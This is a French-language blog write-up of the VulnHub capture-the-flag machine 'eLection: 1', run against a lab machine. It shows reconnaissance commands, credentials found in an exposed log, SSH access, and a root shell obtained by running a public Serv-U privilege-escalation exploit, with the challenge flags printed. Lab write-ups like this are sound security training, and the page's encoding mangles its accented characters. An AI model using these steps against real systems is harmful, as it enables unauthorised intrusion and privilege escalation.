<!DOCTYPE html>
<html data-html-server-rendered="true" lang="fr" data-vue-tag="%7B%22lang%22:%7B%22ssr%22:%22fr%22%7D%7D">
  <head>
    <title>CTF eLection: 1 - https://etienner.github.io</title><meta name="gridsome:hash" content="e9e710b63b02d049a9f8a5359c5c22618737fe2f"><meta data-vue-tag="ssr" charset="utf-8"><meta data-vue-tag="ssr" name="generator" content="Gridsome v0.7.14"><meta data-vue-tag="ssr" data-key="viewport" name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><meta data-vue-tag="ssr" data-key="format-detection" name="format-detection" content="telephone=no"><meta data-vue-tag="ssr" name="description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" property="og:type" content="article"><meta data-vue-tag="ssr" property="og:title" content="CTF eLection: 1"><meta data-vue-tag="ssr" property="og:description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" property="og:url" content="https://etienner.github.io/ctf-e-lection-1/"><meta data-vue-tag="ssr" name="twitter:domain" content="https://etienner.github.io"><meta data-vue-tag="ssr" name="twitter:card" content="summary_large_image"><meta data-vue-tag="ssr" name="twitter:title" content="CTF eLection: 1"><meta data-vue-tag="ssr" name="twitter:description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" name="twitter:site" content="@etiennerouzeaud"><meta data-vue-tag="ssr" name="twitter:creator" content="@etiennerouzeaud"><link data-vue-tag="ssr" rel="icon" href="data:,"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="16x16" href="/assets/static/favicon.ce0531f.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="32x32" href="/assets/static/favicon.ac8d93a.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="96x96" href="/assets/static/favicon.b9532cc.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="76x76" href="/assets/static/favicon.f22e9f3.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="152x152" href="/assets/static/favicon.62d22cb.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="120x120" href="/assets/static/favicon.1539b60.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="167x167" href="/assets/static/favicon.dc0cdc5.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="180x180" href="/assets/static/favicon.7b22250.9bb7ffafafc09ac851d81afb65b8ef59.png"><link rel="preload" href="/assets/css/0.styles.a80f6262.css" as="style"><link rel="preload" href="/assets/js/app.8917d561.js" as="script"><link rel="preload" href="/assets/js/page--src-templates-post-vue.93f54eeb.js" as="script"><link rel="prefetch" href="/assets/js/page--node-modules-gridsome-app-pages-404-vue.5bf39404.js"><link rel="prefetch" href="/assets/js/page--src-pages-index-vue.1fdd30a3.js"><link rel="prefetch" href="/assets/js/page--src-templates-tag-vue.8311241e.js"><link rel="stylesheet" href="/assets/css/0.styles.a80f6262.css"><noscript data-vue-tag="ssr"><style>.g-image--loading{display:none;}</style></noscript>
  </head>
  <body >
    <div data-server-rendered="true" id="app"><header class="py-2 text-center"><strong><a href="/" title="Accueil" class="active">Etienne ROUZEAUD - D√©veloppeur Web</a></strong></header><main><div class="title py-2 text-center" data-v-4b217994><h1 class="display-5 pt-2" data-v-4b217994>CTF eLection: 1</h1><!----></div><div class="container"><div class="row sidebar"><div class="mt-4 col-lg-2"><p><em><span>04 mai 2021</span></em></p><ul class="list-unstyled"><li>
            üè∑Ô∏è <a href="/tag/Pentest/">Pentest</a></li><li>
            üè∑Ô∏è <a href="/tag/CTF/">CTF</a></li></ul><p>‚åö 6 mins de lecture</p><p><a href="https://www.vulnhub.com/entry/election-1,503/" target="_blank" rel="noopener">
            üíæ T√©l√©chargement
          </a></p></div><div class="col-lg-10 mt-4"><!----><article><h2>Avant propos</h2>
<p>Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propri√©taire.<br>
Ce CTF a √©t√© r√©alis√© avec une machine attaquante <strong>Kali 2021.1</strong> (<code class="language-text">lsb_release -r</code>).</p>
<h2>Enum√©ration</h2>
<p>On r√©cup√®re l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class="language-text">sudo netdiscover</code>.<br>
Avant de poursuivre, on exporte cette adresse dans une variable pour √™tre tranquille par la suite <code class="language-text">export IP=192.168.1.20</code>.<br>
Puis on cr√©√© un dossier d√©di√© √† ce CTF <code class="language-text">cd Documents/ctf &amp;&amp; mkdir Election1 &amp;&amp; cd Election1</code>.<br>
On lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ nmap -A -p- <span class="token variable">$IP</span> -oN nmap.txt
Nmap scan report <span class="token keyword">for</span> election.home <span class="token punctuation">(</span><span class="token number">192.168</span>.1.20<span class="token punctuation">)</span>
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0036s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65533</span> closed ports
PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">7</span>.6p1 Ubuntu 4ubuntu0.3 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey:
<span class="token operator">|</span>   <span class="token number">2048</span> <span class="token number">20</span>:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> <span class="token number">78</span>:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.29 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-server-header: Apache/2.4.29 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Apache2 Ubuntu Default Page: It works</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>On a un un serveur <strong>SSH</strong> sur le port <strong>22</strong> et un serveur <strong>Apache</strong> 2.4.29 sur le port <strong>80</strong>.</p>
<p>Astuce vous pouvez ajouter le domaine <em>election1.home</em> dans le fichier <code class="language-text">/etc/hosts</code> avec <strong>Vim</strong> (ou un autre √©diteur de texte).</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">vim</span> /etc/hosts
<span class="token number">192.168</span>.1.20    election1.home</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Testons la s√©curit√© du serveur <strong>Apache</strong> avec <strong>Nikto</strong>.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ nikto -h http://<span class="token variable">$IP</span> -o nikto.txt
+ Server: Apache/2.4.29 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="token keyword">in</span> a different fashion to the MIME <span class="token builtin class-name">type</span>
+ No CGI Directories found <span class="token punctuation">(</span>use <span class="token string">'-C all'</span> to force check all possible <span class="token function">dirs</span><span class="token punctuation">)</span>
+ Server may leak inodes via ETags, header found with <span class="token function">file</span> /, inode: 2aa6, size: 59558e1434548, mtime: <span class="token function">gzip</span>
+ Apache/2.4.29 appears to be outdated <span class="token punctuation">(</span>current is at least Apache/2.4.37<span class="token punctuation">)</span>. Apache <span class="token number">2.2</span>.34 is the EOL <span class="token keyword">for</span> the <span class="token number">2</span>.x branch.
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS
+ /phpinfo.php: Output from the phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> was found.
+ Uncommon header <span class="token string">'x-ob_mode'</span> found, with contents: <span class="token number">1</span>
+ OSVDB-3233: /phpinfo.php: PHP is installed, and a <span class="token builtin class-name">test</span> script <span class="token function">which</span> runs phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span> was found. This gives a lot of system information.
+ OSVDB-3233: /icons/README: Apache default <span class="token function">file</span> found.
+ /phpmyadmin/: phpMyAdmin directory found</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Dans le fichier <a href="http://election1.home/robots.txt" target="_blank" rel="nofollow noopener noreferrer">/robots.txt</a>, on a une liste de 4 r√©pertoires potentiels.</p>
<div class="gridsome-highlight" data-language="txt"><pre style="counter-reset: linenumber NaN" class="language-txt line-numbers"><code class="language-txt">admin
wordpress
user
election</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>Seul le dernier lien "election" fonctionne. On scanne le contenu du site avec <strong>Gobuster</strong></p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ gobuster <span class="token function">dir</span> -u http://<span class="token variable">$IP</span>/election -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.xml,.js,.md,.log,.zip
/index.php            <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">7003</span><span class="token punctuation">]</span>
/media                <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">321</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.20/election/media/<span class="token punctuation">]</span>
/themes               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">322</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.20/election/themes/<span class="token punctuation">]</span>
/data                 <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">320</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.20/election/data/<span class="token punctuation">]</span>
/admin                <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">321</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.20/election/admin/<span class="token punctuation">]</span>
/lib                  <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">319</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.20/election/lib/<span class="token punctuation">]</span>
/languages            <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">325</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.20/election/languages/<span class="token punctuation">]</span>
/js                   <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">318</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.20/election/js/<span class="token punctuation">]</span>
/card.php             <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">1935</span><span class="token punctuation">]</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Scannons le dossier "election/admin" avec <strong>Gobuster</strong>.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ gobuster <span class="token function">dir</span> -u http://<span class="token variable">$IP</span>/election/admin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.xml,.js,.md,.log,.zip
/index.php            <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">8964</span><span class="token punctuation">]</span>
/img                  <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">325</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.20/election/admin/img/<span class="token punctuation">]</span>
/plugins              <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">329</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.20/election/admin/plugins/<span class="token punctuation">]</span>
/css                  <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">325</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.20/election/admin/css/<span class="token punctuation">]</span>
/ajax                 <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">326</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.20/election/admin/ajax/<span class="token punctuation">]</span>
/live.php             <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">22</span><span class="token punctuation">]</span>
/js                   <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">324</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.20/election/admin/js/<span class="token punctuation">]</span>
/components           <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">332</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.20/election/admin/components/<span class="token punctuation">]</span>
/logout.php           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">83</span><span class="token punctuation">]</span>
/inc                  <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">325</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.20/election/admin/inc/<span class="token punctuation">]</span>
/logs                 <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">326</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.20/election/admin/logs/<span class="token punctuation">]</span>
/logs.php             <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">22</span><span class="token punctuation">]</span>
/dashboard.php        <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">22</span><span class="token punctuation">]</span>
/guru.php             <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">22</span><span class="token punctuation">]</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Le r√©pertoire <a href="http://election1.home/election/admin/logs" target="_blank" rel="nofollow noopener noreferrer">/election/admin/logs</a> est int√©ressant car il contient un fichier "system.log".</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> system.log
<span class="token punctuation">[</span><span class="token number">2020</span>-01-01 00:00:00<span class="token punctuation">]</span> Assigned Password <span class="token keyword">for</span> the user love: P@<span class="token variable">$$</span>w0rd@123
<span class="token punctuation">[</span><span class="token number">2020</span>-04-03 00:13:53<span class="token punctuation">]</span> Love added candidate <span class="token string">'Love'</span><span class="token builtin class-name">.</span>
<span class="token punctuation">[</span><span class="token number">2020</span>-04-08 <span class="token number">19</span>:26:34<span class="token punctuation">]</span> Love has been logged <span class="token keyword">in</span> from Unknown IP on Firefox <span class="token punctuation">(</span>Linux<span class="token punctuation">)</span>.
<span class="token punctuation">[</span><span class="token number">2021</span>-04-30 01:19:09<span class="token punctuation">]</span>  has been logged out from Unknown IP.</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>On un candidat potentiel "love:P@$$w0rd@123" pour la connexion <strong>SSH</strong>.</p>
<h3>P√©n√©tration</h3>
<p>On se connecte en <strong>SSH</strong> au serveur avec l'utilisateur "love".</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">ssh</span> love@<span class="token variable">$IP</span>
password: P@<span class="token variable">$$</span>w0rd@123</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>On trouve facilement le flag user dans le dossier "Desktop" de l'utilisateur.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> Desktop/user.txt
cd38ac698c0d793a5236d01003f692b0</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<h3>Escalation</h3>
<p>En cherchant les ex√©cutables avec des permisions sp√©ciales pour l'utilisateur courant (<strong>SUID</strong>), on trouve un r√©pertoire qui sort du lot.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">find</span> / -perm -4000 -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/usr/local/Serv-U/Serv-U</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>En effet, apr√®s une br√®ve recherche sur Internet, <strong>Serv-U</strong> est un serveur <strong>FTP</strong> s√©curis√©. Dans les fichiers pr√©sents, on peut retrouver la version utilis√©e.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> /usr/local/Serv-U/Serv-U-StartupLog.txt
<span class="token punctuation">[</span>01<span class="token punctuation">]</span> Fri 30Apr21 01:02:02 - Serv-U File Server <span class="token punctuation">(</span><span class="token number">64</span>-bit<span class="token punctuation">)</span> - Version <span class="token number">15.1</span> <span class="token punctuation">(</span><span class="token number">15.1</span>.6.25<span class="token punctuation">)</span> - <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">2017</span> SolarWinds Worldwide, LLC.  All rights reserved.</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>On effectue une recherche d'exploit sur <strong>Searchsploit</strong>.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ searchsploit Serv-U <span class="token number">15.1</span>
Serv-U FTP Server <span class="token operator">&lt;</span> <span class="token number">15.1</span>.7 - Local Privilege Escalation <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> linux/local/47009.c
Serv-U FTP Server <span class="token operator">&lt;</span> <span class="token number">15.1</span>.7 - Local Privilege Escalation <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">|</span> multiple/local/47173.sh</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>On trouve 2 exploits semblables, le premier est √©crit en langage C et le second en Shell.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ searchsploit -p <span class="token number">47173</span>
  Exploit: Serv-U FTP Server <span class="token operator">&lt;</span> <span class="token number">15.1</span>.7 - Local Privilege Escalation <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
      URL: https://www.exploit-db.com/exploits/47173
     Path: /usr/share/exploitdb/exploits/multiple/local/47173.sh
File Type: Bourne-Again shell script, ASCII text executable, with CRLF line terminators</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>On copie le fichier <code class="language-text">cp /usr/share/exploitdb/exploits/multiple/local/47173.sh .</code> que l'on converti au format unix pour pouvoir l'ex√©cuter correctement par la suite <code class="language-text">dos2unix 47173.sh</code>. Puis on transf√®re ce dernier sur le serveur via <strong>SCP</strong> dans le dossier "/tmp".</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">scp</span> <span class="token number">47173</span>.sh love@<span class="token variable">$IP</span>:/tmp
password: P@<span class="token variable">$$</span>w0rd@123</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Sur le serveur, on se place dans le r√©pertoire "/tmp" pour ex√©cuter le script.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token builtin class-name">cd</span> /tmp
$ ./47173.sh
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Launching Serv-U <span class="token punctuation">..</span>.
sh: <span class="token number">1</span>: <span class="token builtin class-name">:</span> Permission denied
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Success:
-rwsr-xr-x <span class="token number">1</span> root root <span class="token number">1113504</span> Apr <span class="token number">30</span> 01:44 /tmp/sh
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Launching root shell: /tmp/sh
sh-4.4<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>love<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>love<span class="token punctuation">)</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>love<span class="token punctuation">)</span>,4<span class="token punctuation">(</span>adm<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,33<span class="token punctuation">(</span>www-data<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,116<span class="token punctuation">(</span>lpadmin<span class="token punctuation">)</span>,126<span class="token punctuation">(</span>sambashare<span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>L'exploit a fonctionn√©, on a les droits de l'utilisateur root.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">whoami</span>
root</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>On peut donc acc√©der au flag root.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> /root/root.txt
5238feefc4ffe09645d97e9ee49bc3a6</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
</article></div></div></div></main><footer class="text-white mt-4"><ul class="nav nav-pills justify-content-center"><li><a href="https://github.com/etienner" target="_blank" rel="noopener" class="nav-link">Github</a></li><li><a href="https://medium.com/@etiennerouzeaud" target="_blank" rel="noopener" class="nav-link">Medium</a></li><li><a href="https://twitter.com/etiennerouzeaud" target="_blank" rel="noopener" class="nav-link">Twitter</a></li></ul></footer></div>
    <script src="/assets/js/app.8917d561.js" defer></script><script src="/assets/js/page--src-templates-post-vue.93f54eeb.js" defer></script>
  </body>
</html>
